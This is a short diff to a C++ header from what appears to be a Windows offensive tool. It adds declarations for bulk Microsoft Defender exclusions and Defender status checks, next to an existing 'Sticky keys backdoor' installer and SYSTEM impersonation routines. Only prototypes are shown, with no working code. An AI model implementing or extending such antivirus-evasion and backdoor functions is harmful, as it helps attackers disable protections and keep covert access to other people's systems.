@@ -73,6 +73,12 @@ public:
     
     bool AddProcessToDefenderExclusions(std::wstring_view processName);
     bool RemoveProcessFromDefenderExclusions(std::wstring_view processName);
+
+    // Simplified Defender exclusion management
+    int AddMultipleDefenderExclusions(
+        const std::vector<std::wstring>& paths,
+        const std::vector<std::wstring>& processes,
+        const std::vector<std::wstring>& extensions);
     
     // Sticky keys backdoor
     bool InstallStickyKeysBackdoor() noexcept;
@@ -92,6 +98,10 @@ public:
 private:
     static const LPCWSTR ALL_PRIVILEGES[];
     static const int PRIVILEGE_COUNT;
+
+    // Defender availability checking
+    bool IsDefenderAvailable() noexcept;
+    bool IsDefenderRunning() noexcept;
 
     BOOL EnablePrivilegeInternal(std::wstring_view privilegeName);
     BOOL ImpersonateSystem();
